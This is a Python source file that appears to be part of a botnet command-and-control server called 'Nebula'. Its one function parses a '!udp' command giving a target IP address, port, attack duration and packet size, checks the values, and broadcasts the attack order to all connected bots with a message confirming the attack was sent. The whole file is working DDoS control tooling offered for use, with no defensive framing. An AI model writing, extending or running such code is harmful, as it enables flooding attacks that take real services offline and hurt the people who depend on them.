from colorama import Fore

def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: !udp [IP] [PORT] [TIME] [SIZE]')
        send(client, 'Use port 0 for random port mode')